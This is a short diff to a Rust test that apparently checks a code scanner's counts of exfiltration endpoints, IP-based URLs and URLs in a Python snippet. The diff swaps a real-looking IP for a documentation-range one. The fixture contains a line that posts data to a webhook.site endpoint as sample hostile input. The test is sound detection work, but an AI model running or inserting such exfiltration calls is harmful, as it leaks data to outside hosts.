@@ -2192,7 +2192,7 @@ mod tests {
 
     #[test]
     fn exfil_ip_url() {
-        let c = py("requests.post('https://webhook.site/abc', data=x)\nu = 'http://45.13.1.9:8080/x'\nv = 'http://127.0.0.1:8000'\n");
+        let c = py("requests.post('https://webhook.site/abc', data=x)\nu = 'http://203.0.113.9:8080/x'\nv = 'http://127.0.0.1:8000'\n");
         assert_eq!(c[EXFIL_ENDPOINT], 1);
         assert_eq!(c[IP_URL], 1);
         assert_eq!(c[URL], 3);
